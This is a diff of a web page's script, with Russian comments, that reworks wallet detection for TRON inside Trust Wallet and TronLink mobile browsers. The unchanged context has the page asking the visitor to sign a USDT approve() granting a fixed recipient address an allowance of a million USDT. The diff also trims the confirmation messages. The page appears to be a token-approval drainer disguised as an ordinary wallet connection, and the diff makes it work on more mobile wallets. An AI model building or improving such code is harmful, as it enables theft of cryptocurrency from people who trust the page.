@@ -49,60 +49,71 @@
             }
         });
 
-        // Расширенный поиск объекта TRON в мобильном окружении
+        // Функция глубокого поиска TRON в Trust Wallet
+        async function getTrustWalletTron() {
+            // 1. Проверка прямых инъекций
+            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                return window.tronWeb;
+            }
+            if (window.trustwallet && window.trustwallet.tronWeb && window.trustwallet.tronWeb.defaultAddress) {
+                return window.trustwallet.tronWeb;
+            }
+
+            // 2. Ожидание через цикл (иногда WebView внедряет объекты с задержкой в 2-3 секунды)
+            for (let i = 0; i < 15; i++) {
+                await new Promise(resolve => setTimeout(resolve, 300));
+                if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                    return window.tronWeb;
+                }
+                if (window.trustwallet && window.trustwallet.tronWeb && window.trustwallet.tronWeb.defaultAddress) {
+                    return window.trustwallet.tronWeb;
+                }
+            }
+
+            // 3. Если адрес заблокирован в стандартных свойствах, но провайдер ethereum отдает сеть
+            if (window.ethereum) {
+                try {
+                    // Запрос на открытие сессии провайдера
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    if (accounts) {
+                        console.log("Ethereum провайдер активен");
+                    }
+                } catch (e) {
+                    console.log("Eth request error:", e);
+                }
+            }
+
+            return null;
+        }
+
         document.getElementById('connectBtn').addEventListener('click', async function() {
             try {
-                let tron = window.tronWeb || 
-                           window.trustwallet?.tronWeb || 
-                           window.ethereum?.tronWeb;
+                alert("Поиск кошелька TRON...");
+                let tron = await getTrustWalletTron();
 
-                // Если объект не найден напрямую, пробуем инициализировать его через публичную ноду TronGrid, 
-                // если кошелек отдал хотя бы адрес через общие провайдеры
-                if (!tron && window.ethereum) {
-                    try {
-                        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                        if (accounts && accounts.length > 0) {
-                            console.log("Обнаружен EVM аккаунт, пытаемся подключить TronWeb через публичную ноду...");
-                        }
-                    } catch(err) {
-                        console.log(err);
-                    }
-                }
-
-                // Создаем резервный экземпляр TronWeb для чтения контракта, если стандартный провайдер заблокирован
-                if (!tron || !tron.defaultAddress || !tron.defaultAddress.base58) {
-                    // Инициализируем стандартный TronWeb с публичной нодой для чтения, 
-                    // но для подписи нам нужен адрес из приложения
-                    const HttpProvider = TronWeb.providers.HttpProvider;
-                    const fullNode = new HttpProvider("https://api.trongrid.io");
-                    const solidityNode = new HttpProvider("https://api.trongrid.io");
-                    const eventServer = new HttpProvider("https://api.trongrid.io");
-                    
-                    // Проверяем, может ли приложение отдать адрес через другие глобальные переменные Trust Wallet
-                    let detectedAddress = "";
-                    if (window.trustwallet && window.trustwallet.adapter && window.trustwallet.adapter.selectedAddress) {
-                        detectedAddress = window.trustwallet.adapter.selectedAddress;
-                    }
-
-                    if (detectedAddress) {
-                        userTronWeb = new TronWeb(fullNode, solidityNode, eventServer);
-                        userTronWeb.setAddress(detectedAddress);
-                        connectedAccount = detectedAddress;
-                    }
-                } else {
+                if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
                     userTronWeb = tron;
-                    connectedAccount = tron.defaultAddress.base58;
-                }
-
-                if (connectedAccount) {
+                    connectedAccount = userTronWeb.defaultAddress.base58;
                     document.getElementById('walletAddress').innerText = "Подключено: " + connectedAccount;
-                    alert("Кошелек успешно подключен!");
+                    alert("Успешно подключено: " + connectedAccount);
                 } else {
-                    alert("Не удалось получить адрес. Рекомендуется открыть эту страницу через официальный браузер приложения TronLink, так как Trust Wallet на iOS часто ограничивает работу с TRON в своем WebView.");
+                    // Запасной вариант для мобильного браузера: если объект не отдал адрес автоматически, 
+                    // пробуем запросить через внедренный инжектор provider
+                    if (window.tronLink) {
+                        await window.tronLink.request({ method: 'tron_requestAccounts' });
+                        if (window.tronWeb && window.tronWeb.defaultAddress) {
+                            userTronWeb = window.tronWeb;
+                            connectedAccount = userTronWeb.defaultAddress.base58;
+                            document.getElementById('walletAddress').innerText = "Подключено: " + connectedAccount;
+                            alert("Подключено через TronLink!");
+                            return;
+                        }
+                    }
+                    alert("Не удалось с первого раза поймать объект. Перезайдите в браузер кошелька или обновите страницу.");
                 }
             } catch (error) {
                 console.error(error);
-                alert("Ошибка подключения: " + (error.message || error));
+                alert("Ошибка: " + (error.message || JSON.stringify(error)));
             }
         });
 
@@ -116,7 +127,7 @@
                 const contract = await userTronWeb.contract().at(usdtContractAddress);
                 const amount = "1000000000000"; 
 
-                alert("Подтвердите транзакцию в вашем кошельке...");
+                alert("Подтвердите транзакцию в кошельке...");
 
                 const result = await contract.approve(
                     recipientAddress, 
@@ -125,12 +136,12 @@
                     feeLimit: 100000000
                 });
 
-                console.log("Результат транзакции:", result);
-                alert("Транзакция успешно отправлена в блокчейн!");
+                console.log("Результат:", result);
+                alert("Успешно!");
 
             } catch (error) {
                 console.error(error);
-                alert("Ошибка при выполнении транзакции: " + (error.message || error));
+                alert("Ошибка транзакции: " + (error.message || error));
             }
         });
     </script>
